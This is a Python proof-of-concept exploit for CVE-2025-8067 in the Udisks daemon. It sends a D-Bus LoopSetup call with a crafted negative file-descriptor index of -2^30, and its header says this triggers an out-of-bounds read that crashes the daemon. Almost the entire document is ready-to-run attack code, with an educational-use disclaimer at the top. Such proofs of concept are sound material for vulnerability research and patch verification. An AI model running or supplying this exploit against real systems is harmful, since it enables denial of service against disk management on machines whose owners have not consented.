# Exploit Proof of Concept (PoC)
#
# Author: born0monday
# Target: Udisks daemon
# CVE: CVE-2025-8067
# Description:
# This script crashes the Udisks daemon due to an OOB read.
#
# Disclaimer:
# This code is for educational and research purposes only.
# Use it responsibly and only on systems you have explicit permission to test.

from gi.repository import Gio, GLib

oob_idx = -2**30

bus = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)
proxy = Gio.DBusProxy.new_sync(
     bus,
     Gio.DBusProxyFlags.NONE,
     None,
     "org.freedesktop.UDisks2",
     "/org/freedesktop/UDisks2/Manager",
     "org.freedesktop.UDisks2.Manager",
     None
)

proxy.call_with_unix_fd_list_sync(
     "LoopSetup",
     GLib.Variant("(ha{sv})", (oob_idx, {})),
     Gio.DBusCallFlags.NONE,
     -1,
     Gio.UnixFDList.new_from_array([1]),
     None,
)
